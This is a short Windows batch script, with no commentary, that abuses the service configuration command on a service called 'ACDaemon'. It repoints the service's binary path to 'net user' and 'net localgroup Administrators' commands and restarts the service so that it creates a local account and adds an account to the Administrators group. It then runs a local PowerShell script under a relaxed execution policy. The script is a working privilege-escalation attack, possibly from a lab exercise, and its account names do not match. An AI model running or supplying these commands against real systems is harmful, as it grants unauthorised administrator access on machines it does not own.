Cd\

sc config "ACDaemon" binpath="net user username password /add"
sc stop "ACDaemon"
sc start "ACDaemon"
sc config "ACDaemon" binpath="net localgroup Administrators U /add"
sc stop "ACDaemon"
sc start "ACDaemon"
sc config "ACDaemon" binpath="net localgroup administrators U /add"
sc stop "ACDaemon"

Powershell.exe -executionpolicy remotesigned -File  "S:\Food\Task 2 Trials\Untitled1.ps1"

pause